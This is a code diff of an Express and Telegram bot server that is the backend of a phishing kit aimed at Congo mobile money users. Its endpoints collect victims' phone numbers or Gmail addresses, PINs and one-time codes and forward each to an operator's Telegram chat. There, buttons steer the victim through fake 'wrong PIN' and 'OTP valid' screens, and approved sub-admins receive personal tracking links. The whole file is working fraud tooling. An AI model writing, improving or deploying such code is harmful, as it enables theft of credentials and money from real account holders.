@@ -1,8 +1,3 @@
-/**
- * **AIRTEL CONGO (DRC) - SECURE MULTI-ADMIN SERVER**
- * Updated with Main Admin Authorization Control and Immediate Link on /start.
- */
-
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
@@ -12,19 +7,10 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';
-
-if (!TOKEN) {
-  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
-  process.exit(1);
-}
-
-if (!APP_URL) {
-  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
-  process.exit(1);
-}
+// Secure configuration pulling directly from environment variables with fallback defaults where required
+const getBotToken = () => process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '';
+const getAppUrl = () => process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
+const getFallbackAdmin = () => process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
@@ -34,8 +20,7 @@ function loadAdmins() {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? false, 
-        paid: rec.paid ?? false,
+        authorized: rec.authorized ?? false,
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || '',
@@ -58,33 +43,39 @@ function saveAdmins() {
 }
 
 let bot = null;
+let activeToken = '';
 const sessions = new Map();
 const admins = loadAdmins();
 const adminConfigMessageIds = new Map();
 
-function isValidAirtelCongoNumber(number) {
-  const clean = String(number || '').replace(/\D/g, '');
-  // Airtel Congo (DRC) mobile prefixes start with 099, 097, or 098 followed by 7 digits
-  return /^(099|097|098)\d{7}$/.test(clean);
+function isValidCongoPhone(phone) {
+  if (!phone) return false;
+  const cleaned = String(phone).replace(/\D/g, '');
+  // Supports local format starting with 0 (e.g. 097, 099, 081, 082, 085) or international with 243
+  const regex = /^(?:243|0)?(9[79]|8[125])\d{7}$/;
+  return regex.test(cleaned);
 }
 
 function resolveTargetChat(adminParam) {
+  const fallbackAdminId = getFallbackAdmin();
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
-    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
-      return FALLBACK_ADMIN_ID;
+    if (targetAdmin === String(fallbackAdminId)) {
+      return fallbackAdminId;
     }
     const adminRecord = admins.get(targetAdmin);
     if (adminRecord && adminRecord.authorized) {
       return targetAdmin;
     }
   }
-  return FALLBACK_ADMIN_ID || null;
+  return fallbackAdminId || null;
 }
 
 async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   const PAGE_SIZE = 5;
-  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
+  const fallbackAdminId = getFallbackAdmin();
+  const appUrl = getAppUrl();
+  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(fallbackAdminId));
   const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
   
   if (page < 0) page = 0;
@@ -92,24 +83,24 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
 
   const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
 
-  let adminListText = `👑 *Panneau de Gestion des Administrateurs Adjoints* (Page ${page + 1} sur${totalPages})\n\nGérer le statut d'autorisation :`;
+  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1}/${totalPages})\n\nManage authorizations:`;
   let keyboard = [];
 
   if (adminEntries.length === 0) {
-    adminListText += `\n\nAucun administrateur adjoint n'a encore démarré le bot.`;
+    adminListText += `\n\nNo sub-administrators at the moment.`;
   } else {
     paginatedEntries.forEach(([id, record]) => {
-      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Utilisateur');
-      const authStatus = record.authorized ? '🟢 Autorisé' : '🔴 Non autorisé / En attente';
-      const subLink = `${APP_URL}/?admin=${id}`;
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Statut: ${authStatus}\n   🔗 \`${subLink}\``;
+      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
+      const authStatus = record.authorized ? '🟢 Authorized' : '🔴 Unauthorized';
+      const subLink = `${appUrl}/?admin=${id}`;
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: ${authStatus}\n   🔗 \`${subLink}\``;
     });
   }
 
   let navRow = [];
-  if (page > 0) navRow.push({ text: `⬅️ Précédent`, callback_data: `PAGE_${page - 1}` });
-  navRow.push({ text: `🔄 Actualiser`, callback_data: `PAGE_${page}` });
-  if (page < totalPages - 1) navRow.push({ text: `Suivant ➡️`, callback_data: `PAGE_${page + 1}` });
+  if (page > 0) navRow.push({ text: `⬅️ Previous`, callback_data: `PAGE_${page - 1}` });
+  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
+  if (page < totalPages - 1) navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
   if (navRow.length > 0) keyboard.push(navRow);
 
   if (messageId) {
@@ -131,26 +122,40 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   adminConfigMessageIds.set(chatId, sentMsg.message_id);
 }
 
-async function initBot() {
-  bot = new TelegramBot(TOKEN, { polling: false });
-  
-  const webhookPath = `/bot${TOKEN}`;
-  const webhookUrl = `${APP_URL}${webhookPath}`;
+function initBot() {
+  const currentToken = getBotToken();
+  const appUrl = getAppUrl();
+  const fallbackAdminId = getFallbackAdmin();
 
-  try {
-    await bot.setWebHook(webhookUrl);
-    app.post(webhookPath, (req, res) => {
-      res.sendStatus(200);
-      try { bot.processUpdate(req.body); } catch (err) {}
-    });
-  } catch (err) {
-    process.exit(1);
+  if (!currentToken) {
+    console.error('FATAL: TELEGRAM_BOT_TOKEN or TOKEN environment variable is required.');
+    return;
   }
+
+  if (!appUrl) {
+    console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
+    return;
+  }
+
+  activeToken = currentToken;
+  bot = new TelegramBot(currentToken, { polling: false });
+  
+  const webhookPath = `/bot${currentToken}`;
+  const webhookUrl = `${appUrl}${webhookPath}`;
+
+  bot.setWebHook(webhookUrl).catch((err) => {
+    console.error('Failed to set webhook:', err);
+  });
+
+  app.post(webhookPath, (req, res) => {
+    res.sendStatus(200);
+    try { bot.processUpdate(req.body); } catch (err) {}
+  });
 
   bot.onText(/\/admins/, async (msg) => {
     const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠️ Vous n'avez pas l'autorisation.`);
+    if (chatId !== String(fallbackAdminId)) {
+      await bot.sendMessage(chatId, `⚠️ Unauthorized access.`);
       return;
     }
     await updateContinuousAdminList(chatId, null, 0);
@@ -160,19 +165,26 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       const userId = msg.from.id;
-      const username = msg.from.username ? `@${msg.from.username}` : 'Aucun';
-      const firstName = msg.from.first_name || 'Inconnu';
-      const lastName = msg.from.last_name || 'Inconnu';
+      const username = msg.from.username ? `@${msg.from.username}` : 'None';
+      const firstName = msg.from.first_name || 'Unknown';
+      const lastName = msg.from.last_name || 'Unknown';
       
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-
+      if (chatId !== String(fallbackAdminId)) {
+        const record = admins.get(chatId);
+        if (!record || !record.authorized) {
+          await bot.sendMessage(chatId, `⚠️ Your account is pending primary admin approval.`);
+          return;
+        }
+      }
+      
+      const userLink = `${appUrl}/?admin=${chatId}`;
       let profileText = 
-        `👤 *Informations de votre Lien Spécifique*\n\n` +
-        `• *Prénom :* ${firstName}\n` +
-        `• *Nom :* ${lastName}\n` +
-        `• *Nom d'utilisateur :* ${username}\n` +
-        `• *ID Telegram :* \`${userId}\`\n\n` +
-        `🔗 *Votre Lien Spécifique :*\n${userLink}`;
+        `👤 *Your Link Information*\n\n` +
+        `• *First Name:* ${firstName}\n` +
+        `• *Last Name:* ${lastName}\n` +
+        `• *Username:* ${username}\n` +
+        `• *Telegram ID:* \`${userId}\`\n\n` +
+        `🔗 *Your Specific Link:*\n${userLink}`;
 
       await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
     } catch (err) {}
@@ -183,13 +195,19 @@ async function initBot() {
       const chatId = String(msg.chat.id);
       const userId = msg.from.id;
       const username = msg.from.username || '';
-      const firstName = msg.from.first_name || 'Utilisateur';
+      const firstName = msg.from.first_name || 'User';
       const lastName = msg.from.last_name || '';
+
+      if (chatId === String(fallbackAdminId)) {
+        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Free access active! Link: ${appUrl}\n\nType /admins to manage sub-admins.`, {
+          parse_mode: 'Markdown'
+        });
+        return;
+      }
 
       if (!admins.has(chatId)) {
         admins.set(chatId, {
-          authorized: chatId === String(FALLBACK_ADMIN_ID), // Main admin is auto-authorized
-          paid: false,
+          authorized: false,
           username,
           firstName,
           lastName,
@@ -204,46 +222,38 @@ async function initBot() {
         saveAdmins();
       }
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, 
-          `👑 *Bienvenue Administrateur Principal.*\n\n` +
-          `🔗 *Votre Lien Personnel :*\n${userLink}\n\n` +
-          `Tapez /admins pour voir et gérer les administrateurs adjoints.`, 
-          { parse_mode: 'Markdown' }
-        );
-        return;
-      }
-
       const record = admins.get(chatId);
 
       if (!record.authorized) {
-        // Notify Main Admin about new user requesting authorization
-        await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Nouvel Administrateur Adjoint en Attente!*\n\n` +
-          `👤 *Utilisateur :* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
-          `🆔 *Chat ID :* \`${userId}\`\n\n` +
-          `Veuillez autoriser ou rejeter cette demande.`, 
+        await bot.sendMessage(fallbackAdminId, 
+          `🚨 *New Sub-Admin Request!*\n\n` +
+          `👤 *User:* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
+          `🆔 *Chat ID:* \`${userId}\`\n\n` +
+          `Please approve or reject this request.`, 
           { 
             parse_mode: 'Markdown',
             reply_markup: {
               inline_keyboard: [
                 [
-                  { text: '✅ Autoriser', callback_data: `AUTH_YES_${userId}` },
-                  { text: '❌ Rejeter', callback_data: `AUTH_NO_${userId}` }
+                  { text: '✅ Authorize', callback_data: `AUTH_YES_${userId}` },
+                  { text: '❌ Reject', callback_data: `AUTH_NO_${userId}` }
                 ]
               ]
             }
           }
         );
+
+        await bot.sendMessage(chatId, 
+          `👋 *Welcome ${firstName}!*\n\n` +
+          `⚠️ Your account is **pending approval** from the main administrator.\n\n` +
+          `Please contact the admin to activate your link.`, 
+          { parse_mode: 'Markdown' }
+        );
+        return;
       }
 
-      // Immediately send the user link upon /start
-      let responseText = 
-        `👋 *Bienvenue ${firstName} sur Airtel Congo Bot!*\n\n` +
-        `🔗 *Votre Lien Personnel est prêt :*\n${userLink}\n\n` +
-        `*(Remarque : Votre compte sera pleinement opérationnel dès sa validation par l'administration)*`;
+      const userLink = `${appUrl}/?admin=${chatId}`;
+      let responseText = `👋 *Welcome ${firstName}!* Your account is active.\n\nYour tracking link is ready:\n${userLink}`;
 
       await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
 
@@ -256,18 +266,18 @@ async function initBot() {
       const chatId = String(query.message.chat.id);
 
       if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
-        if (chatId !== String(FALLBACK_ADMIN_ID)) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Action non autorisée.' });
+        if (chatId !== String(fallbackAdminId)) {
+          await bot.answerCallbackQuery(query.id, { text: '⚠️ Unauthorized action.' });
           return;
         }
 
         const parts = actionData.split('_');
-        const decision = parts[1]; 
+        const decision = parts[1];
         const targetSubId = parts[2];
         const subRecord = admins.get(targetSubId);
 
         if (!subRecord) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Administrateur introuvable.' });
+          await bot.answerCallbackQuery(query.id, { text: '⚠️ Administrator not found.' });
           return;
         }
 
@@ -275,16 +285,15 @@ async function initBot() {
           subRecord.authorized = true;
           saveAdmins();
 
-          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
-          
+          const assignedLink = `${appUrl}/?admin=${targetSubId}`;
           await bot.sendMessage(targetSubId, 
-            `🎉 *Félicitations !* Votre compte a été autorisé par l'Administrateur Principal.\n\n` +
-            `🔗 *Votre Lien Spécifique :*\n${assignedLink}`,
+            `🎉 *Congratulations!* Your account has been approved.\n\n` +
+            `🔗 *Your Link:*\n${assignedLink}`,
             { parse_mode: 'Markdown' }
           ).catch(() => {});
 
-          await bot.answerCallbackQuery(query.id, { text: '✅ Administrateur autorisé avec succès!' });
-          await bot.editMessageText(`✅ *Administrateur Adjoint Autorisé*\n\nID : \`${targetSubId}\``, {
+          await bot.answerCallbackQuery(query.id, { text: '✅ Successfully authorized!' });
+          await bot.editMessageText(`✅ *Sub-Admin Authorized*\n\nID: \`${targetSubId}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
@@ -293,9 +302,9 @@ async function initBot() {
           admins.delete(targetSubId);
           saveAdmins();
 
-          await bot.sendMessage(targetSubId, `❌ Votre demande d'administration a été rejetée.`).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '❌ Demande rejetée.' });
-          await bot.editMessageText(`❌ *Demande Rejetée et Supprimée*\n\nID : \`${targetSubId}\``, {
+          await bot.sendMessage(targetSubId, `❌ Your access request was declined.`).catch(() => {});
+          await bot.answerCallbackQuery(query.id, { text: '❌ Request rejected.' });
+          await bot.editMessageText(`❌ *Request Rejected*\n\nID: \`${targetSubId}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
@@ -317,37 +326,37 @@ async function initBot() {
 
       let session = sessions.get(targetId);
       if (!session) {
-        session = { contact: 'Inconnu', adminChatId: chatId };
+        session = { contact: 'Unknown', adminChatId: chatId };
       }
 
       const chatTarget = session.adminChatId || chatId;
 
       switch (prefix) {
         case 'ALLOW_OTP':
-          session.status = 'APPROVED_LOAD_OTP';
-          await bot.sendMessage(chatTarget, `✅ Écran OTP autorisé pour ${session.contact}`);
+          session.status = 'next_step';
+          await bot.sendMessage(chatTarget, `✅ Allowed for ${session.contact}`);
           break;
         case 'DENY_OTP':
-          session.status = 'DENIED';
-          await bot.sendMessage(chatTarget, `❌ Accès refusé pour ${session.contact}`);
+          session.status = 'restart_pin';
+          await bot.sendMessage(chatTarget, `❌ Denied for ${session.contact}`);
           break;
         case 'CORRECT_OTP':
-          session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Écran de succès activé pour ${session.contact}`);
+          session.status = 'success';
+          await bot.sendMessage(chatTarget, `🎉 Success activated for ${session.contact}`);
           break;
         case 'WRONG_PIN':
-          session.status = 'RETRY_PIN';
-          await bot.sendMessage(chatTarget, `⚠️ Alerte PIN incorrect déclenchée.`);
+          session.status = 'restart_pin';
+          await bot.sendMessage(chatTarget, `⚠️ Wrong PIN action triggered.`);
           break;
         case 'WRONG_OTP':
-          session.status = 'RETRY_OTP';
-          await bot.sendMessage(chatTarget, `⚠️ Alerte OTP incorrect déclenchée.`);
+          session.status = 'restart_otp';
+          await bot.sendMessage(chatTarget, `⚠️ Wrong OTP action triggered.`);
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Traité : ${prefix}` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});
 
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup(
@@ -357,7 +366,7 @@ async function initBot() {
       }
     } catch (err) {
       try {
-        await bot.answerCallbackQuery(query.id, { text: '⚠️ Erreur lors du traitement de l’action.' }).catch(() => {});
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Processing error.' }).catch(() => {});
       } catch (e) {}
     }
   });
@@ -369,113 +378,128 @@ app.get('/', (req, res) => {
 
 app.post('/api/submit-application', async (req, res) => {
   try {
-    let { contact, pin, amount, adminChatId } = req.body || {};
+    let { contactType, phone, gmail, adminChatId } = req.body || {};
 
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
 
-    const cleanContact = String(contact || '').replace(/\D/g, '');
-    if (!isValidAirtelCongoNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Veuillez entrer un numéro Airtel Congo valide (ex: 099, 097, ou 098).' });
+    if (contactType === 'phone' && !isValidCongoPhone(phone)) {
+      return res.status(400).json({ success: false, error: 'Invalid phone number. Must start with a valid Congo prefix (097, 099, 081, 082, 085).' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Identifiant de chat invalide ou administrateur non autorisé.' });
+      return res.status(400).json({ success: false, error: 'Invalid chat ID or unauthorized administrator.' });
     }
 
-    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
+    const contactDisplay = contactType === 'phone' ? phone : gmail;
+    const userId = `user_${Date.now()}`;
 
     sessions.set(userId, {
-      contact: cleanContact,
-      pin,
-      amount: amount || 'CDF 2,500,000',
+      contactType,
+      contact: contactDisplay,
       adminChatId: targetChat,
-      status: 'WAITING_PIN_APPROVAL',
+      status: 'pending',
       createdAt: new Date()
     });
 
-    const message =
-      `NEW AIRTEL CONGO APPLICATION\n\n` +
-      `NUMBER: ${cleanContact}\n` +
-      `PIN: ${pin}`;
+    return res.status(200).json({ success: true, sessionId: userId });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: 'Server error: ' + (err?.message || 'Unknown') });
+  }
+});
+
+app.post('/api/submit-pin', async (req, res) => {
+  try {
+    const { sessionId, pin } = req.body || {};
+    const session = sessions.get(sessionId);
+
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    session.pin = pin;
+    session.status = 'pending';
+
+    const message = `🚨 <b>CONGO - NEW SUBMISSION</b>\n\n` +
+                    `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
+                    `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
+                    `<i>Choose action for applicant:</i>`;
 
     const opts = {
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ AUTORISER OTP', callback_data: `ALLOW_OTP_${userId}` },
-            { text: '❌ REFUSER', callback_data: `DENY_OTP_${userId}` }
+            { text: '✅ ALLOW', callback_data: `ALLOW_OTP_${sessionId}` },
+            { text: '❌ DENY', callback_data: `DENY_OTP_${sessionId}` }
           ]
         ]
       }
     };
 
-    if (!bot) {
-      return res.status(500).json({ success: false, error: 'Le bot n\'est pas encore initialisé' });
+    if (bot && session.adminChatId) {
+      const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
+      session.adminMsgId = sentMsg.message_id;
     }
 
-    const sentMsg = await bot.sendMessage(targetChat, message, opts);
-    const session = sessions.get(userId);
-    if (session) session.adminMsgId = sentMsg.message_id;
-    
-    return res.status(200).json({ success: true, userId });
-
+    return res.status(200).json({ success: true });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Échec de l\'envoi via Telegram : ' + (err?.message || 'Erreur inconnue') });
+    return res.status(500).json({ success: false, error: 'Telegram error' });
   }
-});
-
-app.get('/api/check-status/:userId', (req, res) => {
-  const { userId } = req.params;
-  const session = sessions.get(userId);
-  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  res.status(200).json({ status: session.status });
 });
 
 app.post('/api/submit-otp', async (req, res) => {
   try {
-    const { userId, otp } = req.body || {};
-    const session = sessions.get(userId);
+    const { sessionId, otp } = req.body || {};
+    const session = sessions.get(sessionId);
 
-    if (!session) return res.status(404).json({ success: false, error: 'Session introuvable' });
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
 
-    session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
+    session.status = 'pending';
 
-    const message =
-      `NEW AIRTEL CONGO APPLICATION\n\n` +
-      `NUMBER: ${session.contact}\n` +
-      `OTP: ${otp}`;
+    const message = `🔐 <b>CONGO - OTP VERIFICATION</b>\n\n` +
+                    `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
+                    `🔑 <b>OTP Code:</b> ${otp}\n\n` +
+                    `<i>Verify OTP:</i>`;
 
     const opts = {
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '⚠️ PIN INCORRECT', callback_data: `WRONG_PIN_${userId}` },
-            { text: '⚠️ OTP INCORRECT', callback_data: `WRONG_OTP_${userId}` }
+            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${sessionId}` },
+            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${sessionId}` }
           ],
           [
-            { text: '✅ OTP VALIDE', callback_data: `CORRECT_OTP_${userId}` }
+            { text: '✅ OTP VALIDE', callback_data: `CORRECT_OTP_${sessionId}` }
           ]
         ]
       }
     };
 
-    const targetChat = session.adminChatId;
-    if (targetChat && bot) {
-      await bot.sendMessage(targetChat, message, opts);
+    if (bot && session.adminChatId) {
+      const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
+      session.adminMsgId = sentMsg.message_id;
     }
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Échec de l\'envoi via Telegram' });
+    return res.status(500).json({ success: false, error: 'Telegram error' });
   }
 });
 
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, async () => {
-  await initBot();
+app.get('/api/check-status/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  const session = sessions.get(sessionId);
+  if (!session) return res.status(200).json({ status: 'pending' });
+  res.status(200).json({ status: session.status || 'pending' });
 });
-        
+
+const PORT = process.env.PORT || 10000;
+
+app.listen(PORT, () => {
+  console.log(`Server is running and listening on port ${PORT}`);
+  initBot();
+});
+      
